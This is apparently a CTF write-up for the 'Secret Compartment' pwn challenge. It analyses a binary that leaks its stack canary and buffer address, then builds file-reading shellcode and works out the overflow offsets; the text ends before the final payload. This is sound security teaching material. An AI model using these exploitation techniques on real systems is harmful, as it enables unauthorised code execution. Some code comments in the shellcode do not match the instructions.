---
title: CUCTF 2025 Secret Compartment Writeup
slug: cuctf-secret-compartment
---

# CUCTF 2025 Secret Compartment Writeup

::ProseBlockquote
Challenge author: Jackylkk2003

Difficulty: ⭐⭐

Solves: 14
::
Challenge description:
::ProseBlockquote
We are now providing a compartment storage service with a really cheap price!

We also have a secret compartment available if you are interested.

Well, you can't find it anyway, so I guess it doesn't matter.
::

Files: `service`, `Dockerfile`

## Investigation

Let's first inspect the `service` binary.

Running `service` provides us with the following output:

```ansi [Terminal]
I have a compartment available for renting at 0x7fffab39d6e0, but I bet you cannot find my secret compartment
I can rent you some space to put things in this compartment though.
You are lucky that I am making a limited time offer, just HKD 0x575ddd3e6ae1bc00 for 0x88 bytes storage!
```

Then, if we input anything, the program terminates.

Let's also see what security mechanisms are in place using pwntool's [checksec](https://docs.pwntools.com/en/stable/commandline.html#pwn-checksec) utility:

```ansi [Terminal]
└─$ pwn checksec service
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

From this,

- PIE enabled: the stack addresses are scrambled each time it is run.
- Canary: there is a canary to prevent a simple buffer overflow on the stack.
- Stack is executable and there are RWX segments: we can execute shellcode on the stack.

Running `file service` gives us:

```ansi [Terminal]
service: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=52d0dc5a5dcdeba844ad24068a4a3b53e9ae198f, for GNU/Linux 3.2.0, not stripped
```

Crucially, this binary is 64-bit, so the addresses are all in 8-byte chunks.

Looking at the Dockerfile as well,

```ansi [Dockerfile]
FROM ubuntu:25.10

ARG DEBIAN_FRONTEND=noninteractive

RUN apt-get update && \
	apt-get install -y socat && \
	rm -rf /var/lib/apt/lists/*
RUN useradd -M yakitori

WORKDIR /app
COPY --chown=root service ./service
COPY --chown=root flag.txt ./compartment.txt
RUN chmod 755 /app && chmod 755 service && chmod 644 compartment.txt

CMD ["socat", "TCP-LISTEN:3000,fork,reuseaddr", "EXEC:./service,su=yakitori,stderr"]
EXPOSE 3000
```

Clearly, the flag is stored in `app/compartment.txt`, which is owned by the user `yakitori`. The service runs as `yakitori` as well, so if we can exploit the binary to read the file, we can get the flag.

For purposes of local testing, I created an `app/compartment.txt` file with the contents `CTF{flag}`.

## Understanding the program

### Static analysis

To quickly understand the program, we can use [Ghidra](https://github.com/NationalSecurityAgency/ghidra) to decompile the binary. The main function looks like this:

```c [Decompiled main]
undefined8 main(void)
{
  setup();
  fun();
  return 0;
}
```

So taking a look at `fun()` :

```c [Decompiled fun]
void fun(void)
{
  long in_FS_OFFSET;
  char apartment [136];
  long leak;

  leak = *(long *)(in_FS_OFFSET + 0x28);
  printf("I have a compartment available for renting at %p, but I bet you cannot find my secret comp artment\n"
         ,apartment);
  puts("I can rent you some space to put things in this compartment though.");
  printf("You are lucky that I am making a limited time offer, just HKD %p for 0x88 bytes storage!\n "
         ,leak);
  gets(apartment);
  if (leak != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

Simply looking at the decompiled code, we can see that the first address that is printed is the address of the `apartment` buffer, while the second address is `in_FS_OFFSET + 0x28`.

While `in_FS_OFFSET + 0x28` is not apparently useful, by the final check where it calls `__stack_chk_fail()` if its value has changed, we can tell it's the **stack canary**.

There is also a clear **buffer overflow** vulnerability as the apartment buffer is `136` bytes, but `gets` does not check the length of the input so we can input an arbitrary number of bytes. This allows us to overflow the function.

### Dynamic analysis

To confirm our findings regarding the two addresses, we can use `gdb` to run the program.

::ProseAlert
I am using `gdb` with the `pwndbg` plugin, which provides certain useful [features and enhancements](https://github.com/pwndbg/pwndbg).
::

```ansi [GDB disassembly of fun()] {16, 26}
   0x0000555555555439 <+0>:     endbr64
   0x000055555555543d <+4>:     push   rbp
   0x000055555555543e <+5>:     mov    rbp,rsp
   0x0000555555555441 <+8>:     sub    rsp,0xa0
   0x0000555555555448 <+15>:    mov    rax,QWORD PTR fs:0x28
   0x0000555555555451 <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000555555555455 <+28>:    xor    eax,eax
   0x0000555555555457 <+30>:    lea    rax,[rbp-0x90]
   0x000055555555545e <+37>:    add    rax,0x88
   0x0000555555555464 <+43>:    mov    QWORD PTR [rbp-0x98],rax
   0x000055555555546b <+50>:    lea    rax,[rbp-0x90]
   0x0000555555555472 <+57>:    mov    rsi,rax
   0x0000555555555475 <+60>:    lea    rax,[rip+0xb9c]        # 0x555555556018
   0x000055555555547c <+67>:    mov    rdi,rax
   0x000055555555547f <+70>:    mov    eax,0x0
   0x0000555555555484 <+75>:    call   0x5555555550f0 <printf@plt>
   0x0000555555555489 <+80>:    lea    rax,[rip+0xbf0]        # 0x555555556080
   0x0000555555555490 <+87>:    mov    rdi,rax
   0x0000555555555493 <+90>:    call   0x5555555550d0 <puts@plt>
   0x0000555555555498 <+95>:    mov    rax,QWORD PTR [rbp-0x98]
   0x000055555555549f <+102>:   mov    rax,QWORD PTR [rax]
   0x00005555555554a2 <+105>:   mov    rsi,rax
   0x00005555555554a5 <+108>:   lea    rax,[rip+0xc1c]        # 0x5555555560c8
   0x00005555555554ac <+115>:   mov    rdi,rax
   0x00005555555554af <+118>:   mov    eax,0x0
   0x00005555555554b4 <+123>:   call   0x5555555550f0 <printf@plt>
   0x00005555555554b9 <+128>:   lea    rax,[rbp-0x90]
   0x00005555555554c0 <+135>:   mov    rdi,rax
   0x00005555555554c3 <+138>:   mov    eax,0x0
   0x00005555555554c8 <+143>:   call   0x555555555110 <gets@plt>
   0x00005555555554cd <+148>:   nop
   0x00005555555554ce <+149>:   mov    rax,QWORD PTR [rbp-0x8]
   0x00005555555554d2 <+153>:   sub    rax,QWORD PTR fs:0x28
   0x00005555555554db <+162>:   je     0x5555555554e2 <fun+169>
   0x00005555555554dd <+164>:   call   0x5555555550e0 <__stack_chk_fail@plt>
   0x00005555555554e2 <+169>:   leave
   0x00005555555554e3 <+170>:   ret

```

Since we want to confirm what is printed, we can set breakpoints at `fun+75` and `fun+123`, which correspond to the two `printf` calls.

Running the program, it first stops at `fun+75`. Let's take a look at the arguments ot the `printf` call.

```ansi [GDB output at fun+75]
 ► 0x555555555484 <fun+75>     call   printf@plt                  <printf@plt>
        format: 0x555555556018 ◂— 'I have a compartment available for renting at %p, but I bet you cannot find my secret compartment\n'
        rsi: 0x7fffffffdbc0 —▸ 0x7fffffffdc50 —▸ 0x7fffffffdc60 ◂— 1
```

The first argument to `printf` is simply the format string; the second argument, however, is `0x7fffffffdbc0`. This should be the address of the `apartment` buffer (confirmed below)

Continuing to run the program, it stops at `fun_123`. Again, we inspect the arguments to `printf`:

```ansi [GDB output at fun+123]
 ► 0x5555555554b4 <fun+123>    call   printf@plt                  <printf@plt>
        format: 0x5555555560c8 ◂— 'You are lucky that I am making a limited time offer, just HKD %p for 0x88 bytes storage!\n'
        rsi: 0xb6fbf3c3fc6cb400
```

The second argument that is inserted into the format string is `0xb6fbf3c3fc6cb400`. Now we need to figure out if this is the canary.

Taking a look at the disassembly, `[rbp-0x8]` is involved in the checking of the canary before `<__stack_chk_fail@plt>` is called, so it likely is where the canary is.

```ansi [Disassembly] {3}
0x0000555555555448 <+15>:    mov    rax,QWORD PTR fs:0x28
...
0x00005555555554ce <+149>:   mov    rax,QWORD PTR [rbp-0x8]
0x00005555555554d2 <+153>:   sub    rax,QWORD PTR fs:0x28
0x00005555555554db <+162>:   je     0x5555555554e2 <fun+169>
0x00005555555554dd <+164>:   call   0x5555555550e0 <__stack_chk_fail@plt>
```

Now, we can check if the value at `[rbp-0x8]` is indeed the same as what was printed.

```ansi [GDB output checking canary]
pwndbg> x/4x $rbp-0x8
0x7fffffffdc48: 0xfc6cb400      0xb6fbf3c3      0xffffdc60      0x00007fff
```

::ProseAlert
By running `x/4x $rbp-0x8`, we are telling gdb to show us the memory at `$rbp-0x8`. This is equivalent to `[rbp-0x8]`.

If we were to run `p $rbp-0x8`, we would merely get the result of `$rbp-0x8`, which is an address only.
::

Indeed, the value stored at `rbp-0x8` is `0xb6fbf3c3fc6cb400`, which is exactly the same as what was printed. So we have confirmed that the second address printed is the canary.

If we break at `fun+143`, which right at the `gets` call then continue running the function:

```ansi [GDB output checking apartment buffer]
 ► 0x5555555554c8 <fun+143>    call   gets@plt                    <gets@plt>
        rdi: 0x7fffffffdbc0 —▸ 0x7fffffffdc50 —▸ 0x7fffffffdc60 ◂— 1
        rsi: 0x7fffffffda00 ◂— 'You are lucky that I am making a limited time offer, just HKD 0xb6fbf3c3fc6cb400 for 0x88 bytes storage!\nment\n'
        rdx: 0
        rcx: 0
```

The first argument passed to `gets` is the buffer where data is read to. It is `0x7fffffffdbc0`, which is the same as the address of the `apartment` buffer printed earlier. So we've also confirmed that the first leak is the `apartment` buffer where we are allowed input.

## Developing the Exploit

On to the exciting part! We need to put together what we know to print `compartment.txt` to give us the flag.

We'll be using [pwntools](https://docs.pwntools.com/en/stable/) to write the exploit.

### Crafting the shellcode

Since the stack is executable, the easiest way to read the file is to use shellcode.

The below boilerplate (written in nasm) will allow us to print the contents of `/flag.txt`

```asm [shellcode.s]
.global _start

_start:
.intel_syntax noprefix

; --- 1. Construct String: "/flag\x00" ---
; The hex value 0x0067616c662f corresponds to:
; 00 (null terminator) + 67 61 6c 66 (flag) + 2f (/)
mov rbx, 0x0067616c662f
push rbx ; pushes the flag string onto the stack at $rsp
mov rdi, rsp ; rdi now points to the string

; --- 2. Syscall: open("/flag", O_RDONLY) ---
; rdi already holds the pointer to the string
mov rsi, 0 ; O_RDONLY flag
mov rdx, 0 ; mode, ignored for O_RDONLY
mov rax, 2 ; syscall number for open
syscall ; rax now holds the file descriptor (fd)

; --- 3. Syscall: read(fd, rsp, 100) ---
mov rdi, rax ; rdi = fd (from open call)
mov rsi, rsp ; rsi is the buffer to store data, reusing the stack
mov rdx, 100 ; sets max bytes that can be read
mov rax, 0 ; setting rax to the syscall number for read
syscall ; rax now holds the number of bytes read

; --- 4. Syscall: write(1, rsp, bytes_read) ---
mov rdx, rax ; setting rdx to bytes_read
mov rdi, 1 ; STDOUT file descriptor

mov rsi, rsp ; rsi is the buffer with data
mov rax, 1 ; rax holds the syscall number for write
syscall

; --- 5. Syscall: exit(0) ---
mov rdi, 0 ; exit status
mov rax, 60 ; setting rax to the syscall number for exit
syscall
```

However, recall that we need to print `app/compartment.txt`, not `/flag.txt`. Therefore, we need to modify the shellcode to read that instead.

```asm [modified shellcode.s]
; --- 1. Construct String: "/app/compartment.txt" ---
mov rbx, 0x000000007478742e ; .txt\x00
push rbx

mov rbx, 0x746e656d74726170 ; partment
push rbx

mov rbx, 0x6d6f632f7070612f ; /app/com
push rbx

mov rsi, rsp ; rdi now points to the string
```

::ProseAlert
The string is added in 8-byte chunks in reverse order because the stack grows downwards.
::

In `pwntools`, we can assemble the shellcode into sendable bytes using `asm`:

```py [solve.py]
custom_assembly="""
.global _start

_start:
.intel_syntax noprefix

mov rbx, 0x000000007478742e
push rbx
...
"""
shellcode = asm(custom_assembly)
```

Now that we've got the shellcode, we can use it in our exploit. However, how do we make the program run the shellcode?

### Crafting the payload

We already noticed there is a buffer overflow.

Our goals is to

1. overflow the buffer;
2. overwrite the return address to point to our shellcode;
3. and ensure that the canary is not modified so that `__stack_chk_fail()` is not called.

Firstly, let's figure out the offsets between our input buffer, the canary, and the return address.

From our initial run of the program, we already know the input buffer is `0x7fffffffdbc0` and the canary is at `0x7fffffffdc48`.
Subtracting the two, we know the canary is `0x88` bytes after the input buffer.

Next, we can find the return address by breaking right before the `fun()` returns at `fun+169` and continue running the program.

```ansi [GDB output at fun+169]
pwndbg> i f
Stack level 0, frame at 0x7fffffffdc60:
 rip = 0x5555555554e2 in fun; saved rip = 0x555555555500
 called by frame at 0x7fffffffdc70
 Arglist at 0x7fffffffdc50, args:
 Locals at 0x7fffffffdc50, Previous frame's sp is 0x7fffffffdc60
 Saved registers:
  rbp at 0x7fffffffdc50, rip at 0x7fffffffdc58
```

Crucially, rip is stored at `0x7fffffffdc58`. Subtracting this from the input buffer address, we know the return address is `0x98` bytes after the input buffer, or `0x10` bytes after the canary.
